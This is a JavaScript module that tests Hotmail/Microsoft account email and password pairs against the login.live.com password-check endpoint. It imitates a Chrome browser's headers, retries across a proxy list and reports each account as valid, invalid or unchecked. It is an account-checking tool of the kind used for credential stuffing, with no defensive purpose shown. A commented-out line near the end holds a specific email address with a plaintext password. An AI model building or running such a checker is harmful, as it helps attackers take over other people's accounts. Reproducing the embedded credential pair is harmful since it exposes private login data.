const axios = require('axios-https-proxy-fix');

const instance = axios.create({
  timeout: 20000,
})

const checkLoginHotmail = async (email, password, proxyString) => {
  let data = JSON.stringify({
    "username": email,
    "password": password,
    "checkpasswordflowtoken": "",
  });
  const proxyArr = proxyString.split(":");
  const proxy = {
    protocol: 'http',
    host: proxyArr[0],
    port: parseInt(proxyArr[1]),
    ...(proxyArr[2] && {
      auth: { username: proxyArr[2], password: proxyArr[3] }
    })
  }
  return new Promise((resolve) => {
    var options = {
      method: 'POST',
      url: 'https://login.live.com/checkpassword.srf',
      headers: {
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json; charset=utf-8',
        'Origin': 'https://login.live.com',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
        'hpgact': '0',
        'hpgid': '33',
        'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-ch-ua-platform-version': '"14.7.4"'
      },
      data: data,
      // proxy: proxy
    };
    instance.request(options)
      .then(function (response) {
        console.log(response.data);
        if (response?.data?.validationresult === "succeed") {
          resolve('valid');
        } else {
          resolve('invalid');
        }
      }).catch((e) => {
        console.log(e);
        resolve('unchecked');
      });
  });
}

async function checkLoginHotmailWithRetry(email, password, listProxy) {
  let retry = 0;
  let proxies = Array.isArray(listProxy)
    ? listProxy.filter(proxy => proxy && String(proxy).trim())
    : [];

  if (!proxies.length) {
    proxies = [null];
  }

  while (retry < 5) {
    try {
      const proxyString = proxies[retry % proxies.length];
      const result = await checkLoginHotmail(email, password, proxyString);
      if (result === 'valid' || result === 'invalid') {
        return { status: result, email };
      }
    } catch (error) {
      // Try the next proxy, same style as action.js.
    }
    retry++;
  }

  return { status: 'unchecked', email };
}

// (async () => {
//   await checkLoginHotmail("commentaop@hotmail.com", "Lumiong47@", "127.0.0.1:9090");
// })();

module.exports = {
  checkLoginHotmailWithRetry
}
